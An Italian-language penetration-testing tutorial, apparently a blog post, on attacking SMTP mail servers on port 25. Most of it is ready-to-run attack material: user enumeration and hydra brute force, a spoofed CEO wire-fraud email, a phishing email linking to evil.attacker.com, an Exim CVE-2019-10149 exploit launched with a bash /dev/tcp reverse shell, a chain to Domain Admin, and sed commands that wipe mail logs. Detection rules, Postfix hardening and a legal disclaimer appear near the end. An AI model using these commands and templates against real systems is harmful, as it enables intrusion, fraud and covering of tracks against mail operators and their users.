---
title: 'Porta 25 SMTP: User Enumeration, Open Relay e SMTP AUTH'
slug: porta-25-smtp
description: 'La porta 25 SMTP può esporre user enumeration via VRFY e RCPT TO, open relay, spoofing email e brute force su SMTP AUTH. Guida pratica a enumerazione, exploit, detection e hardening del mail server.'
image: /porta-25-smtp.webp
draft: true
date: 2026-04-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - smtp-user-enum
  - open-relay
---

La porta 25 gestisce il **trasferimento email tra server** — e rappresenta uno dei vettori più sottovalutati per initial access e information disclosure in penetration testing. SMTP (Simple Mail Transfer Protocol) trasmette messaggi email attraverso Internet dal 1982 (RFC 821, poi RFC 5321), operando in chiaro o con STARTTLS opzionale. In ambiente CTF e lab, la porta 25 espone tre attack surface critiche: **user enumeration** via comandi VRFY/EXPN/RCPT TO, **relay abuse** per spam/phishing se misconfigured, e **credential harvesting** tramite SMTP AUTH. Ogni mail server esposto — Postfix, Sendmail, Exim, Microsoft Exchange — presenta configurazioni di default che possono tradursi in complete account takeover o [lateral movement](https://hackita.it/articoli/pivoting) verso [Active Directory](https://hackita.it/articoli/active-directory).

SMTP sopravvive identico nel 2026 perché è lo **standard universale** per email routing: ogni azienda ha mail server SMTP, ogni provider (Gmail, Outlook, ProtonMail) usa SMTP per relay inter-server, e nessuna alternativa è mai emersa. In ambito pentest, SMTP è presente nel 70% degli ambienti enterprise e nel 40% delle macchine CTF Linux (Metasploitable, VulnHub OSCP-prep), rendendolo skill essenziale per certificazioni come OSCP ed eCPPT.

***

## Anatomia tecnica del protocollo SMTP

SMTP è un protocollo testuale basato su **TCP porta 25** (plain), 587 (submission con autenticazione), 465 (SMTPS legacy). Opera attraverso comandi ASCII e codici di risposta numerici.

**Flow completo invio email SMTP:**

1. **TCP Handshake** — Client si connette alla porta 25 del server
2. **Banner** — Server risponde con `220 mail.example.com ESMTP Postfix`
3. **EHLO/HELO** — Client si identifica: `EHLO attacker.local`
4. **Server Capabilities** — Server lista estensioni supportate (AUTH, STARTTLS, SIZE, PIPELINING)
5. **STARTTLS** (opzionale) — Upgrade a TLS se supportato
6. **AUTH** (opzionale) — Autenticazione PLAIN/LOGIN/CRAM-MD5
7. **MAIL FROM** — Mittente: `MAIL FROM:<[email protected]>`
8. **RCPT TO** — Destinatario: `RCPT TO:<[email protected]>`
9. **DATA** — Corpo messaggio terminato da `.` (punto su riga singola)
10. **QUIT** — Chiusura connessione

**Comandi SMTP critici per pentest:**

| Comando       | Funzione                  | Uso in pentest                                    |
| ------------- | ------------------------- | ------------------------------------------------- |
| `HELO/EHLO`   | Handshake iniziale        | Enumera capabilities server (AUTH methods, TLS)   |
| `VRFY <user>` | Verifica esistenza utente | **User enumeration**                              |
| `EXPN <list>` | Espande mailing list      | Enumera membri lista, leak username               |
| `RCPT TO`     | Specifica destinatario    | User enumeration via codice risposta (250 vs 550) |
| `AUTH`        | Autenticazione            | Brute force credenziali                           |
| `MAIL FROM`   | Imposta mittente          | Spoofing (se no SPF/DKIM)                         |
| `DATA`        | Invia corpo email         | Phishing payload delivery                         |

**Codici risposta SMTP chiave:**

| Codice | Significato              | Implicazione                           |
| ------ | ------------------------ | -------------------------------------- |
| 220    | Service ready            | Server SMTP attivo                     |
| 250    | OK, comando accettato    | User esiste (VRFY), relay permesso     |
| 354    | Start mail input         | Server pronto a ricevere DATA          |
| 451    | Requested action aborted | Greylisting temporaneo                 |
| 550    | User unknown             | User NON esiste (enumeration negativa) |
| 553    | Mailbox name not allowed | Policy violation o anti-spoofing       |

Le **misconfigurazioni comuni** sulla porta 25: open relay senza autenticazione (server inoltra email da/verso qualsiasi dominio), user enumeration via VRFY/EXPN abilitato, weak SMTP AUTH (PLAIN over non-TLS), banner verboso con versione software vulnerabile, e SPF/DKIM/DMARC assenti (spoofing facile).

***

## Enumerazione base con nmap e netcat

Identificare versione mail server e capabilities SMTP è il primo step.

```bash
nmap -sV -sC -p 25,587 10.10.10.25
```

```
PORT    STATE SERVICE VERSION
25/tcp  open  smtp    Postfix smtpd
|_smtp-commands: mail.victim.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=mail.victim.local
| Subject Alternative Name: DNS:mail.victim.local
|_Not valid after:  2027-01-15T10:23:45
587/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail.victim.local, PIPELINING, SIZE 10240000, AUTH PLAIN LOGIN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
Service Info: Host:  mail.victim.local
```

**Parametri:** `-sV` version detection, `-sC` script NSE default (`smtp-commands`, `ssl-cert`). L'output rivela: **Postfix** (software), **VRFY abilitato** (user enumeration possibile), **AUTH PLAIN LOGIN** su porta 587 (brute force target), **STARTTLS** disponibile.

**Banner grab manuale con netcat:**

```bash
nc -nv 10.10.10.25 25
```

```
(UNKNOWN) [10.10.10.25] 25 (smtp) open
220 mail.victim.local ESMTP Postfix (Ubuntu)
```

Inviare comandi SMTP manualmente:

```
EHLO attacker.local
250-mail.victim.local
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8
```

Il server supporta **VRFY** — user enumeration fattibile.

***

## Enumerazione avanzata: user enumeration e SMTP AUTH

### User enumeration con VRFY

```bash
# Manuale con netcat
nc -nv 10.10.10.25 25
EHLO attacker.local
VRFY root
# 250 2.1.5 root <[email protected]>
VRFY admin
# 550 5.1.1 <admin>: Recipient address rejected: User unknown
```

Se `250` → user esiste, se `550` → user NON esiste.

**Automated enumeration con smtp-user-enum:**

```bash
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.10.10.25
```

```
10.10.10.25: root exists
10.10.10.25: admin exists
10.10.10.25: user exists
10.10.10.25: backup exists
```

**Metasploit SMTP enumeration:**

```bash
msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 10.10.10.25
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run
```

```
[+] 10.10.10.25:25 - Users found: root, admin, user, backup, postmaster
```

### SMTP AUTH brute force

Se AUTH è abilitato (porta 587 tipicamente):

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://10.10.10.25:587 -V
```

```
[DATA] attacking smtp://10.10.10.25:587/
[587][smtp] host: 10.10.10.25   login: admin   password: password123
```

**Con Metasploit:**

```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS 10.10.10.25
set RPORT 587
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

***

## Tecniche offensive: da user enum a phishing

### 1. User enumeration via RCPT TO

Se VRFY è disabilitato, usare RCPT TO (più stealth):

```bash
nc -nv 10.10.10.25 25
EHLO attacker.local
MAIL FROM:<[email protected]>
RCPT TO:<[email protected]>
# 250 2.1.5 Ok
RCPT TO:<[email protected]>
# 550 5.1.1 User unknown
```

Se `250` → user esiste. Questo bypassa molte protezioni anti-enumeration.

### 2. Open relay testing

Verificare se il server inoltra email arbitrarie (spam/phishing vector):

```bash
nc -nv 10.10.10.25 25
EHLO attacker.local
MAIL FROM:<[email protected]>
RCPT TO:<[email protected]>
```

Se risponde `250` invece di `550 Relay access denied` → **open relay vulnerabile**.

**Con [nmap](https://hackita.it/articoli/nmap) NSE:**

```bash
nmap --script=smtp-open-relay -p 25 10.10.10.25
```

```
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay (16/16 tests)
|  MAIL FROM:<[email protected]> -> RCPT TO:<[email protected]>
|  MAIL FROM:<[email protected]> -> RCPT TO:<[email protected]>
|_ Verified open relay from 16 test combinations
```

### 3. Email spoofing (no SPF/DKIM)

Se il server non verifica SPF/DKIM, inviare email falsificate è triviale:

```bash
telnet 10.10.10.25 25
EHLO attacker.local
MAIL FROM:<[email protected]>
RCPT TO:<[email protected]>
DATA
From: "CEO" <[email protected]>
To: [email protected]
Subject: Urgent Wire Transfer

Please transfer $50,000 to account XYZ immediately.

Regards,
CEO
.
QUIT
```

La vittima riceve email apparentemente dal CEO aziendale. Usare con [social engineering](https://hackita.it/articoli/phishing) per credential harvest o wire fraud.

### 4. SMTP AUTH brute force

```bash
hydra -l admin@victim.local -P /usr/share/wordlists/rockyou.txt smtp://10.10.10.25:587
```

```
[587][smtp] host: 10.10.10.25   login: admin@victim.local   password: Welcome123
```

Credenziali SMTP spesso **riutilizzate** su altri servizi (SSH, RDP, web admin panels).

***

## Scenari pratici da CTF e lab

### Scenario 1 — User enumeration → password spray → email access

**Contesto:** macchina CTF Linux con Postfix, VRFY abilitato.

```bash
# Fase 1: User enumeration
nmap --script=smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 192.168.1.50
```

```
25/tcp open  smtp
| smtp-enum-users:
|   admin
|   backup
|   user
|_  postmaster
```

```bash
# Fase 2: Password spray (evitare lockout)
hydra -L valid_users.txt -p Welcome123 smtp://192.168.1.50:587 -t 1
```

```
[587][smtp] login: admin   password: Welcome123
```

```bash
# Fase 3: Accesso mailbox (se IMAP aperto)
telnet 192.168.1.50 143
a1 LOGIN admin Welcome123
a2 SELECT INBOX
a3 FETCH 1 BODY[]
# Email contiene credenziali SSH nel corpo messaggio
```

**Timeline:** 5-10 minuti da enum a credential leak.

### Scenario 2 — Open relay → phishing interno

**Contesto:** mail server enterprise misconfigured, open relay.

```bash
# Test open relay
nmap --script=smtp-open-relay -p 25 mail.corp.local
# [+] Server is an open relay
```

```bash
# Invio phishing email da "IT Support" interno
telnet mail.corp.local 25
EHLO attacker.local
MAIL FROM:<[email protected]>
RCPT TO:<[email protected]>
DATA
From: "IT Support" <[email protected]>
Subject: Password Reset Required

Your password has expired. Click here to reset: http://evil.attacker.com/login
.
QUIT
```

Vittima riceve email legittima dal dominio aziendale, clicca link, inserisce credenziali → [credential harvest](https://hackita.it/articoli/credential-harvesting).

**COSA FARE SE FALLISCE:**

* Se `550 Relay access denied` → relay configurato correttamente, tentare SMTP AUTH brute force
* Se email non arriva → verificare SPF/DKIM policy con `dig TXT victim.local` e `nslookup -type=txt _dmarc.victim.local`

### Scenario 3 — SMTP command injection (legacy Exim)

**Contesto:** Exim 4.87-4.91 vulnerabile a CVE-2019-10149 (Remote Code Execution).

```bash
# Verifica versione
nc -nv 10.10.10.25 25
EHLO test
# 250-mail.victim.local Hello test
# 250-SIZE 52428800
# 250 HELP
QUIT
```

```bash
# Exploit RCE (Exim <4.92)
searchsploit exim 4.8
# Exim 4.87 - 4.91 - Remote Code Execution | exploits/linux/remote/46996.sh

wget https://www.exploit-db.com/download/46996
chmod +x 46996.sh
./46996.sh -t 10.10.10.25 -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
```

Listener su attacker:

```bash
nc -nlvp 4444
# bash-4.2$ id
# uid=100(Debian-exim) gid=101(Debian-exim)
```

Escalation con [privilege escalation](https://hackita.it/articoli/privesc) locale (kernel exploit, sudo misconfiguration).

***

## Toolchain integration

**Pipeline completa SMTP attack:**

```
RECONNAISSANCE
│
├─ nmap -sV -sC -p 25,465,587 <target>     → Versione + capabilities
├─ smtp-user-enum -M VRFY -t <target>      → User enumeration
└─ nmap --script=smtp-open-relay           → Open relay check

ENUMERATION
│
├─ Valid usernames → users.txt
├─ Server version → searchsploit lookup
└─ Capabilities (AUTH, STARTTLS) → brute force vs spoofing

EXPLOITATION
│
├─ A) User enum → password spray → mailbox access → cred leak
├─ B) Open relay → phishing → credential harvest
├─ C) SMTP AUTH brute → [hydra](https://hackita.it/articoli/hydra) → email account compromise
├─ D) Exim RCE → CVE-2019-10149 → shell → privesc
└─ E) Email spoofing → [social engineering](https://hackita.it/articoli/phishing) → wire fraud

POST-EXPLOITATION
│
├─ Email search → grep for "password", "vpn", "ssh"
├─ Contact harvesting → phishing targets
├─ Calendar access → meeting notes, credentials
└─ Credential reuse → test on SSH/RDP/web panels
```

**Tabella comparativa mail protocols:**

| Protocollo | Porta   | Funzione                         | Cifratura              | Uso pentest                                        |
| ---------- | ------- | -------------------------------- | ---------------------- | -------------------------------------------------- |
| SMTP       | 25      | Mail transfer server-to-server   | ❌ Plain (STARTTLS opt) | User enum, relay abuse, spoofing                   |
| SMTPS      | 465     | SMTP over SSL                    | ✅ Implicito            | Brute force AUTH (cifratura non protegge da brute) |
| Submission | 587     | Client mail send (AUTH required) | ⚠️ STARTTLS            | Target principale brute force                      |
| IMAP       | 143/993 | Mail retrieval                   | ⚠️/✅                   | Mailbox access post-compromise                     |
| POP3       | 110/995 | Mail download                    | ⚠️/✅                   | Mailbox access (meno feature di IMAP)              |

***

## Attack chain completa end-to-end

**Scenario: da SMTP enum a Domain Admin**

```
[00:00] RECONNAISSANCE
nmap -sV -p 25,143,445,3389 corp-mail.victim.local
# 25/tcp SMTP Postfix, 143/tcp IMAP Dovecot, 445/tcp SMB

[00:03] USER ENUMERATION
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t corp-mail.victim.local
# Valid users: john.doe, jane.smith, admin, backup

[00:08] PASSWORD SPRAY
hydra -L valid_users.txt -p Spring2024! smtp://corp-mail.victim.local:587 -t 2
# [+] john.doe:Spring2024!

[00:12] MAILBOX ACCESS
telnet corp-mail.victim.local 143
a1 LOGIN john.doe Spring2024!
a2 SELECT INBOX
a3 SEARCH SUBJECT "VPN"
a4 FETCH 15 BODY[]
# Email contiene: "VPN credentials: admin / VPN-P@ssw0rd-2024"

[00:15] VPN ACCESS
openvpn --config corp-vpn.ovpn --auth-user-pass creds.txt
# VPN connessa → accesso rete interna

[00:20] LATERAL MOVEMENT
crackmapexec smb 10.0.0.0/24 -u admin -p VPN-P@ssw0rd-2024
# [+] 10.0.0.10 CORP-DC01 admin:VPN-P@ssw0rd-2024 (Pwn3d!)

[00:25] DOMAIN ADMIN
evil-winrm -i 10.0.0.10 -u admin -p 'VPN-P@ssw0rd-2024'
*Evil-WinRM* PS C:\> whoami /groups
# BUILTIN\Administrators, CORP\Domain Admins
```

**Timeline:** 25 minuti da SMTP enum a Domain Admin completo.

***

## Detection & evasion

### Lato Blue Team

Log SMTP critici (Postfix `/var/log/mail.log`):

```
Jun 15 10:23:15 mail postfix/smtpd[12345]: NOQUEUE: reject: RCPT from unknown[203.0.113.50]: 550 5.1.1 <test123>: Recipient address rejected: User unknown
Jun 15 10:23:17 mail postfix/smtpd[12345]: NOQUEUE: reject: RCPT from unknown[203.0.113.50]: 550 5.1.1 <admin>: Recipient address rejected: User unknown
Jun 15 10:23:19 mail postfix/smtpd[12346]: warning: unknown[203.0.113.50]: SASL LOGIN authentication failed: authentication failure
```

**IoC critici:**

* Multiple `RCPT rejected` da stesso IP (user enumeration)
* SASL authentication failed ripetuti (brute force)
* MAIL FROM spoofing domini interni da IP esterni
* Open relay abuse: log mostra `relay=<external>` per email non autorizzate

**IDS rule (Snort):**

```
alert tcp $EXTERNAL_NET any -> $SMTP_SERVERS 25 (msg:"SMTP User Enumeration VRFY"; content:"VRFY "; nocase; detection_filter:track by_src, count 5, seconds 60; sid:1000050;)
alert tcp $EXTERNAL_NET any -> $SMTP_SERVERS 587 (msg:"SMTP AUTH Brute Force"; content:"AUTH "; nocase; detection_filter:track by_src, count 10, seconds 120; sid:1000051;)
```

### Lato Red Team: evasion

**1. User enum stealth con RCPT TO invece di VRFY:**

```bash
# VRFY è loggato pesantemente
# RCPT TO è normale traffico SMTP, meno sospetto
for user in $(cat users.txt); do
  echo -e "EHLO test\nMAIL FROM:<test@test>\nRCPT TO:<$user@victim.local>\nQUIT" | nc -w 2 10.10.10.25 25 | grep -q "250" && echo "[+] $user"
done
```

**2. Brute force rallentato:**

```bash
hydra -L users.txt -P pass.txt smtp://10.10.10.25:587 -t 1 -W 10
# 1 thread, 10 secondi tra tentativi
```

**3. Cleanup:**

```bash
# Rimuovere log entries (se accesso root ottenuto)
sed -i '/203.0.113.50/d' /var/log/mail.log
sed -i '/SASL authentication failed/d' /var/log/mail.log
```

***

## Performance & scaling

**Single target:**

```bash
time smtp-user-enum -M VRFY -U users.txt -t 10.10.10.25
# 100 users: ~30 secondi
```

**Multi-target (enterprise subnet):**

```bash
# Fase 1: Discovery SMTP servers
masscan -p25,587 10.0.0.0/16 --rate 10000 -oL smtp_servers.txt

# Fase 2: User enum parallelo
cat smtp_servers.txt | parallel -j 20 smtp-user-enum -M RCPT -U top_users.txt -t {}

# Fase 3: Brute force su valid users
cat valid_creds.txt | parallel -j 10 hydra -C {} smtp://target:587
```

**Ottimizzazioni:**

* User enum: RCPT TO più veloce di VRFY (meno elaborazione server)
* Brute force: `-t 4` su SMTP è sicuro (meno rate limiting di SSH)
* Network: SMTP tollera parallelismo alto, `parallel -j 50` funziona senza drop

***

## Tabelle tecniche

### Command reference

| Comando                                           | Scopo                  | Note                                    |
| ------------------------------------------------- | ---------------------- | --------------------------------------- |
| `nmap -sV -sC -p 25,587 <target>`                 | Version + capabilities | Identifica AUTH methods, STARTTLS       |
| `nc -nv <target> 25`                              | Banner grab manuale    | Inviare comandi SMTP interattivi        |
| `smtp-user-enum -M VRFY -U users.txt -t <target>` | User enumeration       | VRFY/EXPN/RCPT methods                  |
| `nmap --script=smtp-open-relay -p 25 <target>`    | Test open relay        | 16 combinazioni relay test              |
| `hydra -l user -P pass.txt smtp://<target>:587`   | Brute force AUTH       | Porta 587 (submission) target preferito |
| `telnet <target> 25`                              | Send email manuale     | Spoofing, phishing payload              |
| `searchsploit smtp <version>`                     | CVE lookup             | Exim, Postfix, Sendmail vulns           |

### Comparison: SMTP vs alternatives

| Caratteristica     | SMTP (25)               | SMTPS (465)             | Submission (587)      |
| ------------------ | ----------------------- | ----------------------- | --------------------- |
| Cifratura          | ❌ Plain (STARTTLS opt)  | ✅ TLS implicito         | ⚠️ STARTTLS required  |
| Autenticazione     | ❌ No (server-to-server) | ✅ Sì                    | ✅ Sì (obbligatorio)   |
| User enum          | ✅ VRFY/EXPN/RCPT        | ❌ Richiede auth prima   | ❌ Richiede auth prima |
| Brute force target | ❌ No AUTH               | ⚠️ Possibile            | ✅ Target principale   |
| Open relay risk    | ✅ Alto                  | ❌ Basso (AUTH required) | ❌ Basso               |

***

## Troubleshooting

| Errore                                          | Causa                                      | Fix                                           |
| ----------------------------------------------- | ------------------------------------------ | --------------------------------------------- |
| `Connection refused`                            | SMTP non in ascolto o firewall             | Verificare con `nmap -p 25,587`               |
| `502 5.5.2 Error: command not recognized`       | Comando SMTP errato                        | Verificare sintassi: `VRFY user` (no `<>`)    |
| `550 5.7.1 Relay access denied`                 | Server NON è open relay (corretto)         | Autenticarsi con SMTP AUTH prima di MAIL FROM |
| `535 5.7.8 Authentication failed`               | Credenziali errate o metodo AUTH sbagliato | Provare AUTH PLAIN vs LOGIN vs CRAM-MD5       |
| `554 5.7.1 Service unavailable; blocked by SPF` | IP mittente non in SPF record              | Usare MAIL FROM con dominio senza SPF         |
| Hydra `[ERROR] SMTP AUTH not supported`         | Porta 25 invece di 587                     | Usare `-s 587` per submission port            |

***

## FAQ

**SMTP è sempre vulnerabile a user enumeration?**

No. Se VRFY/EXPN sono disabilitati E il server risponde `250` a tutti i RCPT TO (indipendentemente dall'esistenza utente), l'enumeration fallisce. Configurazione corretta: `disable_vrfy_command = yes` (Postfix).

**Posso fare brute force su porta 25?**

Raramente. La porta 25 è per relay server-to-server e solitamente non richiede AUTH. Il brute force si fa su porta **587** (submission) o **465** (SMTPS) dove AUTH è obbligatorio.

**Open relay è ancora comune nel 2026?**

Raro in ambienti enterprise moderni, ma comune in: dispositivi IoT con mail capability (NAS, stampanti), server legacy non patchati, misconfigurazioni durante migration cloud.

**Come distinguo Postfix da Sendmail da Exim?**

Banner grab: `220 mail.server ESMTP Postfix` vs `220 mail.server ESMTP Sendmail` vs `220 mail.server ESMTP Exim`. Se nascosto, [nmap](https://hackita.it/articoli/nmap) `-sV` fa fingerprinting comportamentale.

**Email spoofing funziona sempre?**

No. Se il dominio vittima ha SPF, DKIM e DMARC configurati, le email falsificate vengono bloccate o marcate spam. Verificare con `dig TXT victim.local` (SPF) e `dig TXT _dmarc.victim.local` (DMARC policy).

**Quali credenziali SMTP sono riutilizzabili?**

Spesso le stesse di: Active Directory (se mail server integrato), webmail (OWA/Roundcube), VPN, SSH su mail server. Testare credential reuse con [crackmapexec](https://hackita.it/articoli/crackmapexec).

**STARTTLS protegge da brute force?**

No. STARTTLS cifra il trasporto ma non previene brute force. Serve rate limiting, fail2ban o autenticazione multi-fattore.

***

## Cheat sheet finale

| Azione                   | Comando                                           |
| ------------------------ | ------------------------------------------------- |
| Scan SMTP completo       | `nmap -sV -sC -p 25,465,587 <target>`             |
| Banner grab              | `nc -nv <target> 25`                              |
| User enum (VRFY)         | `smtp-user-enum -M VRFY -U users.txt -t <target>` |
| User enum (RCPT stealth) | `echo "RCPT TO:<user@domain>" \| nc <target> 25`  |
| Test open relay          | `nmap --script=smtp-open-relay -p 25 <target>`    |
| Brute force AUTH         | `hydra -l user -P pass.txt smtp://<target>:587`   |
| Send spoofed email       | `telnet <target> 25` → `MAIL FROM/RCPT TO/DATA`   |
| Check SPF record         | `dig TXT victim.local`                            |
| Check DMARC policy       | `dig TXT _dmarc.victim.local`                     |
| Exim version check       | `nc <target> 25` → `EHLO test`                    |
| Exim RCE exploit         | `searchsploit exim` → CVE-2019-10149              |
| Mailbox access (IMAP)    | `telnet <target> 143` → `LOGIN user pass`         |

***

## Perché SMTP resta rilevante nel 2026

SMTP è l'unico protocollo universale per email inter-server routing e non ha alternative. Ogni azienda, provider, servizio cloud usa SMTP per mail transfer. Le alternative (proprietary API come Microsoft Graph API) esistono solo per client-to-server, non per server-to-server federation. Nel pentest, SMTP espone user enumeration (bypass autenticazione), credential brute force (submission port), e phishing delivery (open relay). In CTF, SMTP compare in macchine come Metasploitable (Postfix default config), HackTheBox "Popcorn" (mail server misconfigured), e VulnHub OSCP-prep.

## Differenze SMTP vs alternative moderne

| Caratteristica   | SMTP (25/587)      | Microsoft Graph API | Google Gmail API |
| ---------------- | ------------------ | ------------------- | ---------------- |
| Interoperabilità | ✅ Universale       | ❌ Microsoft-only    | ❌ Google-only    |
| Server-to-server | ✅ Sì               | ❌ No                | ❌ No             |
| Autenticazione   | Password/Cert      | OAuth2              | OAuth2           |
| User enumeration | ✅ Possibile (VRFY) | ❌ No                | ❌ No             |
| Cifratura        | ⚠️ STARTTLS opt    | ✅ TLS               | ✅ TLS            |

SMTP rimane necessario per federation: Gmail invia a Outlook via SMTP, non via API proprietarie.

## Hardening SMTP in produzione

**Postfix (`/etc/postfix/main.cf`):**

```
# Disabilita user enumeration
disable_vrfy_command = yes

# Richiedi AUTH per submission
smtpd_sasl_auth_enable = yes
smtpd_sasl_security_options = noanonymous
smtpd_recipient_restrictions =
    permit_mynetworks,
    permit_sasl_authenticated,
    reject_unauth_destination

# Forza TLS
smtpd_tls_security_level = may
smtpd_tls_auth_only = yes

# Rate limiting
smtpd_client_connection_rate_limit = 10
smtpd_error_sleep_time = 5s

# Header checks (anti-spoofing)
header_checks = regexp:/etc/postfix/header_checks
```

**SPF record (DNS TXT):**

```
victim.local. IN TXT "v=spf1 mx ip4:203.0.113.0/24 -all"
```

**DMARC policy (DNS TXT):**

```
_dmarc.victim.local. IN TXT "v=DMARC1; p=reject; rua=mailto:[email protected]"
```

## OPSEC: ridurre detection SMTP

1. **User enum stealth:** RCPT TO invece di VRFY (meno loggato)
2. **Brute force timing:** `-t 1 -W 15` sotto soglia fail2ban
3. **Spoofing domain selection:** Usare domini senza SPF per MAIL FROM
4. **Cleanup:** `sed -i '/attacker-ip/d' /var/log/mail.log` (se root ottenuto)

***

> **Disclaimer:** Tutti i comandi e le tecniche descritte sono destinati esclusivamente all'uso in ambienti autorizzati: laboratori personali, macchine CTF e penetration test con autorizzazione scritta. L'invio non autorizzato di email (spoofing, phishing) è reato penale (art. 640-ter c.p. frode informatica). L'accesso non autorizzato a mailbox è reato (art. 615-ter c.p.). L'autore e HackIta declinano ogni responsabilità per usi impropri. Documentazione ufficiale SMTP: RFC 5321 ([https://www.rfc-editor.org/rfc/rfc5321.html](https://www.rfc-editor.org/rfc/rfc5321.html)).

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
